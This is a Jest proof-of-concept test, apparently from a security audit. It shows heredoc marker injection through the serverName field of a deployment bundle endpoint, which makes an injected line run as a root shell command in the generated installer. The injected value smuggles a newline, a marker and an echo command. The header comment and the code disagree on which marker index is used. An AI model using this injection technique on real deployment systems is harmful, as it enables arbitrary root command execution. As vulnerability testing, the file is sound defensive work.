/**
 * PoC — AG-B01: deployment bundle heredoc marker injection
 * Target: POST /api/deployments/generate-bundle (deployments.routes.ts:940)
 *
 * Claim: /generate-bundle does NOT invoke inputValidator.validateRequest
 * (unlike /generate at :645). validateProfile only checks non-empty strings
 * and numeric ranges, so profile.serverName may contain newlines and the
 * heredoc marker string used by renderSelfExtractingBundle. A newline +
 * '__AETHERGUARD_BUNDLE_0__' + payload inside serverName terminates the
 * heredoc of file #0 early, and the payload line becomes a TOP-LEVEL shell
 * command in the self-extracting installer executed as root on the target.
 *
 * Auth note: route requires admin (T7 malicious/duped operator). Auth is
 * mocked here because the vulnerability under test is the sink, not auth.
 */
import request from 'supertest';
import express from 'express';
import deploymentsRouter from '../../backend/src/api/routes/deployments.routes';

jest.mock('../../backend/src/middleware/auth.middleware', () => ({
  authenticate: jest.fn((req: any, _res: any, next: any) => {
    req.user = { userId: 'admin-user', role: 'admin', tenantId: 'tenant-001' };
    next();
  }),
  requireRole: jest.fn(() => (req: any, _res: any, next: any) => next()),
  AuthenticatedRequest: jest.fn()
}));

jest.mock('../../backend/src/utils/logger', () => ({
  __esModule: true,
  default: { error: jest.fn(), warn: jest.fn(), info: jest.fn() }
}));

jest.mock('../../backend/src/modules/deployments/deployment-profile.repository', () => ({
  getDeploymentProfile: jest.fn(),
  getNextDeploymentProfileVersion: jest.fn(() => 1),
  listDeploymentProfiles: jest.fn(() => []),
  saveDeploymentProfile: jest.fn()
}));

jest.mock('../../backend/src/security/audit-logger.service', () => ({
  __esModule: true,
  default: { log: jest.fn().mockResolvedValue(undefined) }
}));

jest.mock('../../backend/src/services/command-dispatcher.service', () => ({
  commandDispatcherService: { dispatchDeviceCommand: jest.fn() }
}));

const MARKER = '__AETHERGUARD_BUNDLE_1__'; // buildBundleFiles puts the server config at index 1
// file[1] of buildBundleFiles is the server config (nginx.conf) which embeds serverName
const PAYLOAD_LINE = 'echo PWNED_BUNDLE_MARKER_ESCAPE';
const EVIL_SERVER_NAME = `api.example.com\n${MARKER}\n${PAYLOAD_LINE}\n#`;

describe('PoC AG-B01: generate-bundle heredoc marker injection', () => {
  const app = express();
  app.use(express.json());
  app.use('/api/deployments', deploymentsRouter);

  test('A) /generate-bundle accepts newline+marker in serverName and emits payload as top-level shell line', async () => {
    const res = await request(app)
      .post('/api/deployments/generate-bundle')
      .send({
        serverType: 'nginx',
        profile: { serverName: EVIL_SERVER_NAME, port: 8080, upstream: 'http://backend:3005', rateLimit: 100 }
      });

    // expect HTTP 200 — request accepted (no InputValidator on this route)
    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);

    const script = Buffer.from(res.body.data.bundleBase64, 'base64').toString('utf8');
    const lines = script.split('\n');

    // locate the heredoc start for file #0
    const catIdx = lines.findIndex((l) => l.includes(`<<'${MARKER}'`));
    expect(catIdx).toBeGreaterThanOrEqual(0);

    // find the FIRST standalone marker line after the heredoc start:
    // if it is followed by our payload line, the heredoc was terminated early
    const earlyMarkerIdx = lines.findIndex((l, i) => i > catIdx && l.trim() === MARKER);
    expect(earlyMarkerIdx).toBeGreaterThan(catIdx);

    // the line right after the early-terminated marker is attacker-controlled
    expect(lines[earlyMarkerIdx + 1].trim()).toBe(PAYLOAD_LINE);

    // and the early marker occurs BEFORE the genuine end-of-content marker
    // (there is a second, genuine marker closer further down)
    const genuineCloserIdx = lines.findIndex((l, i) => i > earlyMarkerIdx + 1 && l.trim() === MARKER);
    expect(genuineCloserIdx).toBeGreaterThan(earlyMarkerIdx + 1);
  });

  test('B) /generate (with InputValidator) rejects the same payload — protection gap is route-specific', async () => {
    const res = await request(app)
      .post('/api/deployments/generate')
      .send({
        serverType: 'nginx',
        profile: { serverName: EVIL_SERVER_NAME, port: 8080, upstream: 'http://backend:3005', rateLimit: 100 }
      });

    expect(res.status).toBe(400);
  });
});
